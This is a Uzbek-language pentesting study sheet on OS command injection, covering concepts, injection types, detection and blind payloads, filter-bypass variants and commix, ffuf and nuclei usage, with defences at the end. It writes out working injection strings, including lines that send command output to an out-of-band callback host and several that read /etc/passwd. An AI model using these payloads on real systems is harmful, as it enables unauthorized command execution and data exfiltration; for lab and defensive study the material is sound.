# OS Command Injection

> Lab yechimlari (PortSwigger'ning 5 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Ba'zan ilova ishni bajarish uchun operatsion tizim buyrug'ini chaqiradi (masalan `ping <host>`,
fayl konvertatsiya). Agar sening inputing (`host`) shell buyrug'iga **tozalanmay** qo'shilsa, sen
buyruq ajratuvchi belgi (`;`, `|`, `&&`, `` `...` ``) bilan **o'z buyrug'ingni** qo'shib yuborasan.
U buyruq server shell'ida, ilova foydalanuvchisi huquqi bilan bajariladi — ya'ni to'g'ridan RCE.

**Ildiz sabab:** SQLi/XSS bilan bir xil — data va code aralashgan. Ilova foydalanuvchi matnini
shell'ga string sifatida beradi (`system("ping " + host)`), shell esa `;`/`|` ni "buyruq
ajratuvchi" deb o'qiydi. Yechim: shell'ni chaqirmaslik yoki argumentlarni massiv sifatida uzatish.

## Turlari (natijani olish bo'yicha)
- **In-band / results-based** — buyruq natijasi javobda ko'rinadi (`whoami` chiqadi).
- **Blind — time-based** — natija ko'rinmaydi → `ping -c 10` / `sleep 10` bilan kechiktir.
- **Blind — output redirection** — natijani web-accessible faylga yozib, keyin o'qiysan.
- **Blind — OOB** — `nslookup`/`curl` bilan DNS/HTTP orqali natijani tashqariga chiqarasan.

## Oqibatlar (IMPACT)
- **Serverda istagan buyruqni ishlatish** — to'liq nazorat.
- Fayl o'qish/yozish, reverse shell, persistence.
- Ichki tarmoqqa pivot, cloud credential o'g'irlash.
> RCE = **Critical**. Bundan og'irrog'i kam.

## Qayerdan qidiriladi
Ping/traceroute, DNS lookup, fayl konvertor (ImageMagick/ffmpeg), PDF generator,
backup, `exec`/`system` chaqiradigan har narsa, filename, zip/unzip.

## Buyruq birlashtiruvchilar
```bash
;   &&   ||   &   |   `cmd`   $(cmd)   %0a (newline)
```

## Aniqlash
```bash
# Misol: ping=8.8.8.8
8.8.8.8; whoami
8.8.8.8 | whoami
8.8.8.8 && whoami
8.8.8.8%0awhoami
`whoami`
$(whoami)
```

## Blind (javob chiqmasa)
```bash
# Time-based
& ping -c 10 127.0.0.1 &
| sleep 10
`sleep 10`

# OOB (callback) — eng ishonchli
& nslookup `whoami`.xxx.oast.pro &
; curl http://xxx.oast.pro/$(whoami)

# Fayl orqali o'qish
& whoami > /var/www/html/out.txt &   # keyin /out.txt ni och
```

## WAF/filtr bypass
```bash
cat</etc/passwd            # probel o'rniga <
{cat,/etc/passwd}          # qavs bilan
cat$IFS/etc/passwd         # IFS = probel
w'h'o'am'i                 # keyword bo'lish
wh\oami
/bin/c?t /etc/passwd       # wildcard
echo d2hvYW1p|base64 -d|bash   # base64
```

## TOOLLAR

### commix — command injection podshosi
```bash
commix -u "https://target.com/ping?ip=127.0.0.1" --batch
```
> Parametrni avtomat sinab, injection topsa o'zi pseudo-shell ochadi.

```bash
commix -r request.txt --batch
```
> Burp request faylidan (POST/header ichidagi injection'ni ham) sinaydi.

```bash
commix -u "URL" --os-cmd="id"
```
> Faqat bitta buyruq ishlatib natijani ko'rsatadi (PoC uchun toza).

### interactsh — blind OOB callback
```bash
interactsh-client
```
> Blind injection'da `nslookup xxx.oast.pro` payloadini ishlatasan — DNS so'rov kelsa tasdiqlandi.

### ffuf — payload fuzzing
```bash
ffuf -w cmdi-payloads.txt -u "https://target.com/ping?ip=127.0.0.1FUZZ" -mr "root:|uid="
```
> Har xil injection payloadini sinab, `uid=` yoki `root:` chiqqanini ushlaydi.

### nuclei — ommaviy CMDi
```bash
nuclei -l params_urls.txt -tags cmdi,rce -iserver "$(interactsh)"
```
> Ko'p URL'ni tayyor shablon + callback bilan tekshiradi.

## PoC
`id`/`hostname` chiqishini ko'rsat (zararsiz). Reverse shell / destruktiv buyruq ishlatma.

## Himoya
Shell'ga buyruq qurma — parametrlangan API (`execFile` arg massiv), `shell=False`,
input allowlist (faqat raqam/IP).
